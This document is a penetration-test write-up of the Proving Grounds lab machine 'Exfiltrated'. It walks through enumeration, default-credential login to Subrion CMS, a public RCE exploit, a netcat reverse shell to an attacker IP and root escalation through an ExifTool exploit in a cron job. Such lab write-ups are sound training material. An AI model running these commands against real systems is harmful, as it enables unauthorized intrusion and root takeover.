# Report-Exfiltrated

## Engagement Overview

Laboratory: Offensive Security Proving Grounds

Target Name: Exfiltrated

Target IP Address: 192.168.132.163

Operating System: Linux

## Information Gathering:

Full Nmap scan of all ports:


```bash
nmap -sC -sV -p- 192.168.132.163
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 13:00 +0100
Nmap scan report for 192.168.132.163
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.86 seconds
```

Enumeration of port 80 using a browser:

```bash
sudo nano /etc/hosts
```
Adding exfiltrated.offsec
<img width="1327" height="749" alt="Pasted image 20260119130733" src="https://github.com/user-attachments/assets/8fbb94e9-168c-435d-86ac-55a4f936fbe7" />

```bash
sudo gobuster dir -w '/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt' -u http://exfiltrated.offsec -t 42 -b 400,401,403,404 --exclude-length 355
```
<img width="1110" height="593" alt="Pasted image 20251124172507" src="https://github.com/user-attachments/assets/a6605c3b-2f78-4049-a44b-813cfe058b98" />

The application was identified as Subrion CMS based on information displayed in the page footer.
<img width="384" height="160" alt="Pasted image 20260119131130" src="https://github.com/user-attachments/assets/ff4b111d-9e17-4c3f-8e1d-9845e76c1aa0" />


Subrion CMS

In robots.txt I saw different pages.

<img width="707" height="248" alt="Pasted image 20260119132808" src="https://github.com/user-attachments/assets/0c890735-8b34-4145-9cee-93131ea93d15" />


The /panel endpoint was identified as an administrative login page.

<img width="1320" height="753" alt="Pasted image 20260119132844" src="https://github.com/user-attachments/assets/ec436f34-4da2-414b-913a-c752df9380b6" />


Default credentials (admin:admin) were successfully used to authenticate.

Searching Exploit-DB for  PoC on Subrion's vulnerability: 


<img width="1221" height="388" alt="Pasted image 20260119132937" src="https://github.com/user-attachments/assets/a1e8823e-4d9f-4282-a17f-bddb5281f5a1" />


Proof of concept Code:https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE

## Initial Access

Vulnerability Exploited: SubrionCMS 4.2.1 Authenticated Remote Code Execution (CVE-2018-19422)

Vulnerability Explanation: /panel/uploads in Subrion CMS 4.2.1 allows remote attackers to execute arbitrary PHP code via a .pht or .phar file, because the .htaccess file omits these.


### Exploitation:


Command:

```
python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

<img width="875" height="300" alt="Pasted image 20260119132638" src="https://github.com/user-attachments/assets/0a714a11-3ded-4113-933e-0efbdeb8a8c6" />



The webshell was obtained as www-data user.
I obtained the reverse shell with 
```bash
busybox nc 192.168.45.234 4444 -e /bin/bash
```

The shell was stabilized using the following command:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Privilege Escalation

Vulnerability Exploited: ExifTool 12.23 - Arbitrary Code Execution (CVE-2021-22204)

Vulnerability Explanation:  improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

### Enumeration:

During local enumeration, a cron job running as root was identified:
```
cat /etc/crontab
```

<img width="869" height="420" alt="Pasted image 20260119135330" src="https://github.com/user-attachments/assets/64919dd3-c18d-461c-8f32-6d9c2003c552" />


/opt/image-exif.sh

<img width="481" height="377" alt="Pasted image 20260119135545" src="https://github.com/user-attachments/assets/499fb217-b1bf-4641-ab3d-029d567fb00a" />


The script was observed invoking ExifTool to process image files.

Exiftool has a CVE: https://www.exploit-db.com/exploits/50911




<img width="1064" height="364" alt="Pasted image 20260119141150" src="https://github.com/user-attachments/assets/3dd84ffb-5a30-4606-a72f-3ef8b59b9503" />

### Exploitation:

The comand created image.jpg with a reverse shell.
```bash
sudo python3 exploit-CVE-2021-22204.py -s 192.168.45.234 4445
```

<img width="1184" height="275" alt="Pasted image 20260119141903" src="https://github.com/user-attachments/assets/8f305583-45ee-426e-9195-775b854a4c90" />


The malicious image was placed in /var/www/html/subrion/uploads, as specified by the image-exif.sh script.
Then I opened the listener waiting the reverse shell.

<img width="591" height="132" alt="Pasted image 20260119142030" src="https://github.com/user-attachments/assets/0a2cdbf3-8194-454d-8aa1-3c30fb20b2eb" />


The reverse shell was obtained as the root user.
